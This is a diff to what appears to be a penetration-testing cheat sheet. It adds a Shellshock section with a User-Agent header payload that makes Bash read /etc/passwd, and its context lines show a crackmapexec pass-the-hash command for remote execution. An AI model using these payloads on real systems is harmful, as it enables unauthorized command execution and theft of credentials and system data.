@@ -267,6 +267,13 @@ crackmapexec smb IP -u Username -H "NTLMHASH" -x "commands"
 
 ```
 
+## SHELLSHOCK
+```
+User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
+
+
+```
+
 
 ## SSH LOGIN
 ```
